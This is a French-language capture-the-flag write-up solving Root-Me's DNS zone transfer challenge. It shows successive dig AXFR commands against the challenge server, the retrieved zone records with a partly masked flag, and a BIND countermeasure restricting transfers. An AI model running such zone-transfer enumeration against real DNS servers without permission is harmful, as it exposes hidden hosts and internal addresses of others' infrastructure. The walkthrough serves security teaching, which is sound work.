# Write-up : DNS - Transfert de zone (Root-Me)

 ## Informations du challenge

 | Élément | Valeur |
 |---------|--------|
 | Plateforme | Root-Me |
 | Catégorie | Réseau |
 | Points | 15 |
 | Difficulté | Facile |
 | Hôte | challenge01.root-me.org |
 | Port | 54011 |
 | Domaine cible | ch11.challenge01.root-me.org |

 ---

 ## Concept : Qu'est-ce qu'un transfert de zone DNS ?

 Le **transfert de zone (AXFR)** est un mécanisme DNS permettant de répliquer l'intégralité des enregistrements d'une zone DNS d'un serveur primaire vers un serveur secondaire.

 **Utilisation légitime :** Synchroniser les serveurs DNS d'une infrastructure.

 **Vulnérabilité :** Si le serveur autorise l'AXFR à n'importe qui, un attaquant peut récupérer tous les enregistrements DNS, révélant :
 - Des sous-domaines cachés
 - Des adresses IP internes
 - Parfois des informations sensibles

 ---

 ## Outil utilisé : `dig`

 `dig` (Domain Information Groper) est un outil en ligne de commande pour interroger les serveurs DNS.

 ### Syntaxe générale

 ```bash
 dig @serveur -p port domaine type_requête
 ```

 | Paramètre | Description |
 |-----------|-------------|
 | `@serveur` | Serveur DNS à interroger |
 | `-p port` | Port du serveur (53 par défaut) |
 | `domaine` | Nom de domaine ciblé |
 | `type_requête` | Type d'enregistrement (A, MX, TXT, AXFR...) |

 ---

 ## Résolution pas à pas

 ### Étape 1 : Première tentative (échec)

 ```bash
 dig AXFR ch11.challenge01.root-me.org
 ```

 **Résultat :** `Transfer failed`

 **Pourquoi ?** Cette commande interroge le serveur DNS par défaut du système (ici 1.1.1.1) sur le port 53. Ce n'est pas le serveur du challenge.

 ---

 ### Étape 2 : Ajout du port (échec)

 ```bash
 dig AXFR challenge01.root-me.org -p 54011
 ```

 **Résultat :** `Connection to 192.168.0.1#54011 failed: connection refused`

 **Pourquoi ?** Le port est correct, mais sans `@serveur`, dig interroge le DNS local (192.168.0.1).

 ---

 ### Étape 3 : Ajout du serveur, oubli du domaine (échec)

 ```bash
 dig AXFR @challenge01.root-me.org -p 54011
 ```

 **Résultat :** Réponse vide (28 octets)

 **Pourquoi ?** On contacte le bon serveur sur le bon port, mais on n'a pas précisé **quel domaine** transférer.

 ---

 ### Étape 4 : Commande complète (succès)

 ```bash
 dig AXFR @challenge01.root-me.org ch11.challenge01.root-me.org -p 54011
 ```

 **Résultat :**

 ```
 ch11.challenge01.root-me.org. 604800 IN SOA  ch11.challenge01.root-me.org. root.ch11.challenge01.root-me.org. 2 604800 86400 2419200 604800
 ch11.challenge01.root-me.org. 604800 IN TXT  "DNS transfer secret key : C**********jHY"
 ch11.challenge01.root-me.org. 604800 IN NS   ch11.challenge01.root-me.org.
 ch11.challenge01.root-me.org. 604800 IN A    127.0.0.1
 challenge01.ch11.challenge01.root-me.org. 604800 IN A 192.168.27.101
 ch11.challenge01.root-me.org. 604800 IN SOA  ch11.challenge01.root-me.org. root.ch11.challenge01.root-me.org. 2 604800 86400 2419200 604800
 ```

 ---

 ## Analyse des enregistrements récupérés

 | Type | Valeur | Signification |
 |------|--------|---------------|
 | SOA | ch11.challenge01.root-me.org | Start of Authority - infos sur la zone |
 | TXT | "DNS transfer secret key : ..." | **Le flag !** |
 | NS | ch11.challenge01.root-me.org | Serveur de noms |
 | A | 127.0.0.1 | Adresse IP du domaine |
 | A | 192.168.27.101 | Sous-domaine avec IP interne |

 ---

 ## Flag

 ```
 DNS transfer secret key : C**********jHY
 ```

 > **Attention :** Il fallait entrer la phrase complète, pas seulement la clé.

 ---

 ## Contre-mesures

 Pour sécuriser un serveur DNS :

 ```bind
 // Dans named.conf (BIND)
 zone "exemple.com" {
     type master;
     file "/etc/bind/zones/exemple.com";
     allow-transfer { 192.168.1.2; };  // Limiter aux IP autorisées
 };
 ```

 ---

 ## Commandes utiles

 ```bash
 # Transfert de zone
 dig AXFR @serveur domaine

 # Filtrer uniquement les TXT
 dig AXFR @serveur domaine | grep TXT

 # Alternatives à dig
 host -t AXFR domaine serveur
 nslookup -type=AXFR domaine serveur
 ```
